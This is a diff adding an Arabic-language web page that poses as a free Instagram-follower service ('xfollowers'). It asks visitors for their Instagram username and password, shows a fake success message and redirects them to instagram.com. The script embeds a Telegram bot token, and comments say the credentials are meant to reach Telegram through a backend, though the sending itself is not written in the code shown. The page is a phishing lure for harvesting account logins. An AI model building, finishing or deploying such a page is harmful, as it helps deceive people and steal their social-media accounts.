@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>sjjskoo |xfolo</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+    margin:0;
+    min-height:100vh;
+    font-family:Arial,sans-serif;
+    background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+}
+
+.card{
+    width:100%;
+    max-width:430px;
+    background:#fff;
+    border-radius:22px;
+    padding:30px 24px;
+    text-align:center;
+    box-shadow:0 15px 45px rgba(0,0,0,.25);
+}
+
+.logo{
+    font-size:38px;
+    font-weight:bold;
+    margin-bottom:8px;
+    background:linear-gradient(45deg,#405de6,#833ab4,#fd1d1d,#f77737);
+    -webkit-background-clip:text;
+    color:transparent;
+}
+
+.subtitle{
+    color:#666;
+    font-size:14px;
+    line-height:1.7;
+    margin-bottom:25px;
+}
+
+textarea{
+    width:100%;
+    height:120px;
+    resize:none;
+    border:1px solid #ddd;
+    border-radius:14px;
+    padding:15px;
+    font-size:15px;
+    outline:none;
+    margin-bottom:14px;
+    background:#fafafa;
+}
+
+textarea:focus{
+    border-color:#833ab4;
+    box-shadow:0 0 0 3px rgba(131,58,180,.1);
+}
+
+button{
+    width:100%;
+    border:0;
+    border-radius:13px;
+    padding:14px;
+    font-size:16px;
+    font-weight:bold;
+    color:white;
+    cursor:pointer;
+    background:linear-gradient(45deg,#405de6,#833ab4,#fd1d1d);
+}
+
+button:hover{
+    opacity:.92;
+}
+
+.info{
+    margin-top:20px;
+    padding:13px;
+    background:#f7f7f7;
+    border-radius:12px;
+    color:#666;
+    font-size:13px;
+    line-height:1.7;
+}
+
+.status{
+    display:none;
+    margin-top:15px;
+    padding:12px;
+    border-radius:10px;
+    background:#e8f8ee;
+    color:#16803c;
+    font-size:14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+    <div class="logo">xfollowers</div>
+
+    <div class="subtitle">
+      تزويد متابعين انستقرام مجانا10000يوميا 💌
+    </div>
+
+    <textarea id="message1" placeholder="Username"></textarea>
+
+    <textarea id="message2" placeholder="password"></textarea>
+
+    <button onclick="sendMessages()">
+        بدء التزويد
+    </button>
+
+    <div class="status" id="status">
+        تم بدء بنجاح ❤️
+    </div>
+
+    <div class="info">
+    موقع تزويد متابعين10000فاليوم مجانا .
+    </div>
+
+</div>
+
+<script>
+
+// توكن وهمي للتجربة فقط
+const TELEGRAM_BOT_TOKEN = "8944200679:AAEHUqH-1xk-bauUGrCYfPNZgcrscAafSrA";
+
+// ضع هنا رابط الصفحة التي تريد الانتقال إليها بعد الإرسال
+const NEXT_URL = "https://www.instagram.com";
+
+function sendMessages(){
+
+    const message1 =
+        document.getElementById("message1").value.trim();
+
+    const message2 =
+        document.getElementById("message2").value.trim();
+
+    if(!message1 || !message2){
+        alert("اكتب البيانات  أولاً");
+        return;
+    }
+
+    /*
+      الإرسال الحقيقي إلى Telegram لا يوضع هنا.
+      يجب إرسال البيانات إلى Backend آمن يحتوي
+      على TELEGRAM_BOT_TOKEN.
+
+      التوكن الموجود هنا وهمي فقط:
+      8944200679:AAEHUqH-1xk-bauUGrCYfPNZgcrscAafSrA
+    */
+
+    document.getElementById("status").style.display = "block";
+
+    setTimeout(function(){
+        window.location.href = NEXT_URL;
+    },1500);
+}
+
+</script>
+
+</body>
+</html>
